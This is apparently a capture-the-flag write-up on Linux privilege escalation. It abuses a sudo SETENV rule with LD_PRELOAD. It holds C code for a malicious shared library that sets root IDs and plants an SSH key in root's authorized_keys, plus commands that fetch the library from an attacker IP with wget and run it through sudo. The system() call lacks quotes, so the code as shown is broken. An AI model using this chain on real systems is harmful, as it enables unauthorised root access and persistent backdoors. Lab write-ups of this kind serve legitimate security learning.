Privilege escalation   

Method : Abusing SETENV   

Learning SETENV.it seems important to figure out what it means and have a good understanding of how sudo handles environment variables. Checking the sudoers man page against what’s in this configuration, in the flags, there’s env_reset, which basically says that, because there’s no env_keep setting, none of waldo’s environment will be passed:

If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The default contents of the env_keep and env_check lists are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

Next the SETENV tag says that as the caller, I can override env_reset using -E or by setting variables on the command line when I call sudo:

SETENV and NOSETENV

These tags override the value of the setenv option on a per-command basis. Note that if SETENV has been set for a command, the user may disable the env_reset option from the command line via the -E option. Additionally, environment variables set on the command line are not subject to the restrictions imposed by env_check, env_delete, or env_keep. As such, only trusted users should be allowed to set variables in this manner. If the command matched is ALL, the SETENV tag is implied for that command; this default may be overridden by use of the NOSETENV tag.

secure_path was also mentioned in the env_reset page, and is set here. It prevents the sudo caller from setting the $PATH variable:

secure_path Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the ‘‘root path’’ be separate from the ‘‘user path’’. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.

Reference Sudoers Man Page   
[https://linux.die.net/man/5/sudoers](https://linux.die.net/man/5/sudoers)

Inside the opt dir of in this box. There is a bash script owned by root and the user we owned can run the bash script as root

Theory

Reading the script and we found the script is using two bash cammand cat and truncate
It turns out there is a library path hijack to exploit cleanup.sh. I can pass a $LD_PRELOAD into sudo.

About LD_PRELOAD

If you set LD_PRELOAD to the path of a shared object, that file will be loaded before any other library (including the C runtime, libc.so). So to run ls with your special malloc() implementation, do this

To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid. For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded.

```bash
Sudo LD_PRELOAD=/path/to/my/malloc.so /bin/ls
```

Reference : [https://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick](https://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick)

Exploit

Save as /tmp/pe.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system(mkdir -p /root/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys);
}
```

compile it on own our machine because target machine has no gcc
```bash
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Wget the complie file to target /photobomb/source_images/ dir. The reason we put the file in that dir excuteing the cleanup script with sudo permision the file with jpg extention in that dir has change the ownership to root from that point we need to change our exploit file extention to jpg and excuteing the script its change the ownership . After that we change the extention back to .so and load the file to LD_PRELOAD varilable

```bash
# getting file from attacker to remote machine
wget http://10.10.16.8/pe.so
# move pe.so to jpg extention to change the ownership
mv pe.so pe.so.jpg 
#run the cleanup scirpt
sudo /opt/cleanup.sh
# Back to the so extention
mv pe.so.jpg pe.so
# Command for load the pe.so along with cleanup.sh
sudo LD_PRELOAD=~/photobomb/source_images/pe.so /opt/cleanup.sh
```

Referance :[ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#env-info]( https://book.hacktricks.xyz/linux-hardening/privilege-escalation#env-info)   
Alternative referance : [https://0xdf.gitlab.io/2020/09/26/htb-admirer.html](https://0xdf.gitlab.io/2020/09/26/htb-admirer.html)












